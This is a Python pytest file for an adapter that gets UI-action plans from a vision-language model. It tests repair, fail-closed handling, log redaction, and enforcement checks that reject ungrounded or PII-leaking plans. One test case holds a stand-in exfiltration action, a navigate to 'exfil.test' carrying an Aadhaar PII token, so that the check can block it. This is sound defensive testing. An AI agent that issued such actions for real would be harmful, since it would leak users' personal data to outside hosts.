"""OpenAICompatibleAdapter against a fake OpenAI-compatible endpoint (Stage 3A Part G).

Everything here is respx-mocked; no test in this file reaches the network.
"""

from __future__ import annotations

import json
import logging
import re

import httpx
import pytest
import respx

from app.schemas.payload import PayloadV2
from app.vlm.openai_compatible_adapter import (
    ENFORCEMENT_FAILURE_CODES,
    FAIL_MODEL_OUTPUT_INVALID,
    FAIL_MODEL_TIMEOUT,
    FAIL_MODEL_UNAVAILABLE,
    FAIL_MODEL_UNGROUNDED,
    OpenAICompatibleAdapter,
    enforce,
)

BASE_URL = "https://model.test/v1"
COMPLETIONS = f"{BASE_URL}/chat/completions"
API_KEY = "sk-super-secret-do-not-log"


def adapter(**kwargs) -> OpenAICompatibleAdapter:
    return OpenAICompatibleAdapter(base_url=BASE_URL, model="test-vlm", api_key=API_KEY, **kwargs)


def completion(content: str, usage: dict | None = None) -> httpx.Response:
    return httpx.Response(
        200,
        json={
            "choices": [{"message": {"content": content}}],
            "usage": usage or {"prompt_tokens": 100, "completion_tokens": 20},
        },
    )


def valid_plan(payload: PayloadV2) -> str:
    el = payload.elements[0]
    return json.dumps(
        {
            "schema": "aegis/2",
            "state_token": payload.state_token,
            "plan": [
                {
                    "action": "click",
                    "target": {"eid": el.eid, "fp": el.fp},
                    "expect": {"eid": el.eid, "visible": True},
                }
            ],
        }
    )


@pytest.fixture
def payload(kyc_payload) -> PayloadV2:
    return PayloadV2.model_validate(kyc_payload)


@respx.mock
@pytest.mark.anyio
async def test_valid_response_passes_through(payload):
    route = respx.post(COMPLETIONS).mock(return_value=completion(valid_plan(payload)))
    result = await adapter().plan(payload)
    assert result.plan[0].action == "click"
    assert route.call_count == 1


@respx.mock
@pytest.mark.anyio
async def test_invalid_then_repaired(payload):
    respx.post(COMPLETIONS).mock(
        side_effect=[completion("not json at all"), completion(valid_plan(payload))]
    )
    subject = adapter()
    result = await subject.plan(payload)
    assert result.plan[0].action == "click"
    assert subject.last_metrics.repairs == 1
    assert subject.last_metrics.json_valid_first_try is False


@respx.mock
@pytest.mark.anyio
async def test_invalid_twice_fails_closed(payload):
    respx.post(COMPLETIONS).mock(side_effect=[completion("not json"), completion("still not json")])
    result = await adapter().plan(payload)
    assert result.plan[0].action == "fail"
    assert result.plan[0].reason == FAIL_MODEL_OUTPUT_INVALID


@respx.mock
@pytest.mark.anyio
async def test_code_fenced_json_is_accepted(payload):
    # Models wrap JSON in fences constantly; that alone should not cost a repair round-trip.
    respx.post(COMPLETIONS).mock(return_value=completion(f"```json\n{valid_plan(payload)}\n```"))
    subject = adapter()
    result = await subject.plan(payload)
    assert result.plan[0].action == "click"
    assert subject.last_metrics.repairs == 0


@respx.mock
@pytest.mark.anyio
async def test_timeout_fails_closed(payload):
    respx.post(COMPLETIONS).mock(side_effect=httpx.ReadTimeout("too slow"))
    result = await adapter().plan(payload)
    assert result.plan[0].reason == FAIL_MODEL_TIMEOUT


@respx.mock
@pytest.mark.anyio
async def test_server_error_fails_closed(payload):
    respx.post(COMPLETIONS).mock(return_value=httpx.Response(503))
    result = await adapter().plan(payload)
    assert result.plan[0].reason == FAIL_MODEL_UNAVAILABLE


@respx.mock
@pytest.mark.anyio
@pytest.mark.parametrize(
    ("mutate", "expected"),
    [
        pytest.param(
            lambda p, plan: {**plan, "state_token": "Szzzzzzzzzz"},
            "STATE_TOKEN_MISMATCH",
            id="wrong state token",
        ),
        pytest.param(
            lambda p, plan: {
                **plan,
                "plan": [{"action": "click", "target": {"eid": "E999999", "fp": "x"}}],
            },
            "UNKNOWN_EID",
            id="unknown eid",
        ),
        pytest.param(
            lambda p, plan: {
                **plan,
                "plan": [
                    {"action": "click", "target": {"eid": p.elements[0].eid, "fp": "wrong-fp"}}
                ],
            },
            "FP_MISMATCH",
            id="fp mismatch",
        ),
        pytest.param(
            lambda p, plan: {
                **plan,
                "plan": [
                    {"action": "navigate", "url": "https://exfil.test/?v=[[PII:AADHAAR:aaaaaaaa]]"}
                ],
            },
            "TOKEN_IN_URL",
            id="token in url",
        ),
        pytest.param(
            lambda p, plan: {
                **plan,
                "plan": [
                    {"action": "key", "key": "[[PII:AADHAAR:aaaaaaaa]]"},
                ],
            },
            "TOKEN_IN_KEY",
            id="token in key",
        ),
        pytest.param(
            lambda p, plan: {
                **plan,
                "plan": [
                    {
                        "action": "select",
                        "target": {"eid": p.elements[0].eid, "fp": p.elements[0].fp},
                        "value": "[[PII:AADHAAR:aaaaaaaa]]",
                    }
                ],
            },
            "TOKEN_IN_SELECT_VALUE",
            id="token in select value",
        ),
        pytest.param(
            lambda p, plan: {
                **plan,
                "plan": [
                    {
                        "action": "click",
                        "target": {"eid": p.elements[0].eid, "fp": p.elements[0].fp},
                        "expect": {"eid": p.elements[0].eid, "visible": True},
                    }
                ]
                * 6,
            },
            "TOO_MANY_ACTIONS",
            id="too many actions",
        ),
    ],
)
async def test_each_enforcement_failure_returns_its_own_code(payload, mutate, expected):
    """Regression test: a rejection used to always come back as the generic
    MODEL_OUTPUT_UNGROUNDED, hiding its real cause (e.g. TOO_MANY_ACTIONS) from the client and the
    probe. Every distinct enforce() violation must now travel to the client as itself."""
    plan = json.loads(valid_plan(payload))
    respx.post(COMPLETIONS).mock(return_value=completion(json.dumps(mutate(payload, plan))))
    subject = adapter()
    result = await subject.plan(payload)
    assert result.plan[0].action == "fail"
    assert result.plan[0].reason == expected
    assert subject.last_metrics.outcome == expected
    # None of these are the generic bucket they used to collapse into.
    assert expected != FAIL_MODEL_UNGROUNDED


@respx.mock
@pytest.mark.anyio
async def test_context_request_naming_an_element_returns_its_own_code(payload):
    respx.post(COMPLETIONS).mock(
        return_value=completion(
            json.dumps(
                {
                    "schema": "aegis/2",
                    "state_token": payload.state_token,
                    "request_context": {
                        "reason": f"reveal {payload.elements[0].eid} please",
                        "kind": "more_elements",
                    },
                }
            )
        )
    )
    result = await adapter().plan(payload)
    assert result.plan[0].action == "fail"
    assert result.plan[0].reason == "CONTEXT_REQUEST_NAMES_ELEMENT"


@respx.mock
@pytest.mark.anyio
async def test_image_is_sent_when_the_payload_has_one(payload):
    route = respx.post(COMPLETIONS).mock(return_value=completion(valid_plan(payload)))
    await adapter().plan(payload)
    content = json.loads(route.calls[0].request.content)["messages"][-1]["content"]
    assert any(part["type"] == "image_url" for part in content)


@respx.mock
@pytest.mark.anyio
async def test_no_image_part_when_the_payload_has_none(kyc_payload):
    # SAME_SCREEN captures ship no image; the request must then be text-only rather than carrying
    # a stale picture of a screen the model has already seen.
    without_image = PayloadV2.model_validate({k: v for k, v in kyc_payload.items() if k != "image"})
    route = respx.post(COMPLETIONS).mock(return_value=completion(valid_plan(without_image)))
    await adapter().plan(without_image)
    content = json.loads(route.calls[0].request.content)["messages"][-1]["content"]
    assert all(part["type"] != "image_url" for part in content)


@respx.mock
@pytest.mark.anyio
async def test_neither_bodies_nor_the_api_key_are_ever_logged(payload, caplog):
    respx.post(COMPLETIONS).mock(return_value=completion(valid_plan(payload)))
    with caplog.at_level(logging.DEBUG, logger="aegis.vlm"):
        await adapter().plan(payload)

    logged = "\n".join(record.getMessage() for record in caplog.records)
    assert API_KEY not in logged
    assert payload.elements[0].label not in logged
    assert "[[PII:" not in logged
    assert "data:image" not in logged
    # What SHOULD be there: shape.
    assert "latency" in logged


@respx.mock
@pytest.mark.anyio
async def test_metrics_record_shape_not_content(payload):
    respx.post(COMPLETIONS).mock(
        return_value=completion(
            valid_plan(payload), usage={"prompt_tokens": 512, "completion_tokens": 64}
        )
    )
    subject = adapter()
    await subject.plan(payload)
    assert subject.last_metrics.prompt_tokens == 512
    assert subject.last_metrics.completion_tokens == 64
    assert subject.last_metrics.model_latency_ms >= 0
    assert subject.last_metrics.outcome == "ok"


def test_enforce_accepts_a_grounded_plan(payload):
    from app.schemas.plan import PlanV2

    assert enforce(PlanV2.model_validate(json.loads(valid_plan(payload))), payload) is None


def test_enforce_rejects_a_context_request_naming_an_element(payload):
    from app.schemas.plan import PlanV2

    plan = PlanV2.model_validate(
        {
            "schema": "aegis/2",
            "state_token": payload.state_token,
            "request_context": {
                "reason": f"reveal {payload.elements[0].eid} please",
                "kind": "more_elements",
            },
        }
    )
    assert enforce(plan, payload) == "CONTEXT_REQUEST_NAMES_ELEMENT"


def test_enforce_allows_tokens_inside_an_answer(payload):
    from app.schemas.plan import PlanV2

    plan = PlanV2.model_validate(
        {
            "schema": "aegis/2",
            "state_token": payload.state_token,
            "answer": {"text": "Your balance is [[PII:FINANCIAL_VALUE:aaaaaaaa]]"},
        }
    )
    assert enforce(plan, payload) is None


def test_check_action_reports_token_outside_type(payload):
    # A real PlanV2 can never carry `text` on a non-`type` action — Action's own validator
    # (schemas/plan.py) already forbids it, so this path is unreachable through plan() today. It
    # stays as a defensive fallback (AGENTS.md invariant 3: a token belongs in exactly one place),
    # and this pins its code directly against `_check_action` with a minimal stand-in, since a
    # real Action cannot be constructed to reach it.
    from types import SimpleNamespace

    from app.vlm.openai_compatible_adapter import _check_action

    action = SimpleNamespace(
        action="click",
        target=SimpleNamespace(eid=payload.elements[0].eid, fp=payload.elements[0].fp),
        url=None,
        key=None,
        value=None,
        text="[[PII:AADHAAR:aaaaaaaa]]",
    )
    by_eid = {el.eid: el for el in payload.elements}
    assert _check_action(action, by_eid) == "TOKEN_OUTSIDE_TYPE"


def test_enforcement_failure_codes_cover_every_enforce_violation():
    """Every string `enforce()`/`_check_action` can return is in the closed set the probe and any
    other caller uses to recognize a rejection — this is what would have caught the original bug
    one layer up, had it existed then."""
    import inspect

    from app.vlm import openai_compatible_adapter as module

    source = inspect.getsource(module.enforce) + inspect.getsource(module._check_action)
    referenced = set(re.findall(r'return "([A-Z_]+)"', source))
    assert referenced <= ENFORCEMENT_FAILURE_CODES
